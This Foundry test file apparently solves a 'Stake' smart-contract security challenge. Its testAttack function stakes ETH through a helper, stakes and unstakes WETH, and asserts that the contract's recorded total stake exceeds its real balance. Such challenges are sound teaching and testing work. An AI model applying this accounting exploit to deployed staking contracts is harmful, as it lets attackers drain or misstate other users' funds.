// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Stake} from "src/challenge-31-stake/Stake.sol";
import {StakeEthHelper} from "src/challenge-31-stake/StakeEthHelper.sol";
import {ERC20Mock} from "openzeppelin-contracts-08/mocks/ERC20Mock.sol";

contract StakeTest is Test {
    Stake public stake;
    ERC20Mock public weth;
    StakeEthHelper public helper;

    address public user = makeAddr("user");

    function setUp() public {
        weth = new ERC20Mock("Wrapped Ether", "WETH", user, 10 ether);
        stake = new Stake(address(weth));
        helper = new StakeEthHelper(address(stake));

        vm.deal(user, 1 ether);
        vm.deal(address(helper), 1 ether);

        vm.prank(user);
        weth.approve(address(stake), type(uint256).max);

        vm.label(address(stake), "Stake");
        vm.label(address(weth), "Weth");
        vm.label(address(user), "user");
    }

    function testAttack() public {
        helper.stakeETH{value: 0.002 ether}();

        vm.startPrank(user);
        stake.StakeWETH(0.002 ether);
        stake.Unstake(0.002 ether);
        vm.stopPrank();

        helper.stakeETH{value: 0.002 ether}();

        assertTrue(address(stake).balance > 0);
        assertTrue(stake.totalStaked() > address(stake).balance);
        assertTrue(stake.Stakers(user));
        assertEq(stake.UserStake(user), 0);
    }
}
